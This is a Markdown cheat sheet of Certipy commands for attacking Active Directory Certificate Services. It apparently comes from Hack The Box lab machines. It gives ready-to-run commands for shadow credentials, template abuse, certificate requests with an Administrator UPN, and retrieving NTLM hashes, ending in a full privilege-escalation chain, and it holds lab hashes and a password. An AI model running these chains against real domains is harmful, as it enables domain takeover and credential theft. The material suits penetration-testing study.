# certipy

## Overview

## Usage

### Account

Change the UPN of target user:

```shell
certipy account -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.179.157 -upn 'administrator' -user 'ca_svc' update
```

### Auth

Return a hash for the account of the private key

```shell
certipy auth -pfx ./administrator.pfx -dc-ip 10.129.251.172
```
```shell
faketime "$(ntpdate -q fluffy.htb | awk '{print $1" "$2}')" certipy auth -dc-ip '10.129.179.157' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
```

### Find

The find command is useful for enumerating AD CS certificate templates, certificate authorities and other configurations. The find operation searches for vulnerabilities such as missing or misconfigured certificates, insecure settings, or issues with Kerberos encryption types.

    -scheme <scheme>: This specifies which scheme should be used to communicate with the target Domain Controller.
    -k: The -k flag indicates that Kerberos authentication should be used for the request. Certipy will attempt to authenticate with the Kerberos tickets that are either provided or found in the Kerberos ticket cache
    -debug: The -debug flag enables debugging output.
    -target <target_name>.<domain_name>: DNS name of the target
    -dc <ip>: Domain Controller ip.
    -vulnerable: This flag tells Certipy to look for vulnerabilities related to Kerberos and Active Directory certificate configurations.
    -stdout: The -stdout flag indicates that Certipy should print its results to standard output, rather than saving them to a file.

```shell
KRB5CCNAME=$PWD/<victim_username_with_TGT>.ccache certipy-ad find -scheme <scheme> -k -debug -target <target_dns_name> -dc-ip <domain_controller_ip> -vulnerable -stdout
```

```shell
KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip 10.129.251.172 -vulnerable -stdout
```


Find vulnerabilities:

```shell
certipy-ad find -vulnerable -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.193.226 -stdout
```

Find templates:

```shell
certipy find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.179.157 -stdout
```


### Req

Request a certificate:

```shell
KRB5CCNAME=$PWD/ca_svc.ccache faketime "$(ntpdate -q fluffy.htb | awk '{print $1" "$2}')" certipy req -k -dc-host '10.129.179.157' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
```

```shell
certipy req -u ca_svc -hashes :{ca_svc_hash} -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip {ip} -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns {ip} -dns {ip}
```

Might need to be run multiple times to work

### Shadow Credentials

```shell
certipy-ad shadow auto -u <username>@<domain_name> -p '<password>' -dc-ip <domain_controller_ip> -ns <dns_server_ip> -target <domain_controller_name>.<domain_name> -account <username_victim>
```

Example : 
```shell 
certipy-ad shadow auto -u ryan@sequel.htb -p '<password>' -dc-ip 10.129.251.172 -ns 10.129.251.172 -target dc01.sequel.htb -account ca_svc
```
```shell
faketime "$(ntpdate -q fluffy.htb | awk '{print $1" "$2}')" certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.129.193.226 -account 'winrm_svc'
```

### Template

This specifies the Kerberos template to use when requesting a Kerberos ticket. This template is used when performing actions like generating tickets or performing Kerberos-based attacks (like Pass-the-Ticket (PTT) or Golden Ticket).

Example: 
```shell 
KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.129.251.172
```


## Examples

### Shadow Credentials

Do a shadow crendentials attack to get a TGT for the account ca_svc

```shell
certipy-ad shadow auto -u ryan@sequel.htb -p '<password>' -dc-ip 10.129.251.172 -ns 10.129.251.172 -target dc01.sequel.htb -account ca_svc
```

With the TGT of ca_svc specify a template and get a private key for the Administrator account:

```shell
    KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.129.251.172
    certipy-ad req -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip 10.129.251.172 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.129.251.172 -dns 10.129.251.172
```

Finally authenticate with the private key and get the NTLM hash for the Administrator account:

```shell
    certipy-ad auth -pfx ./administrator_10.pfx -dc-ip 10.129.251.172
```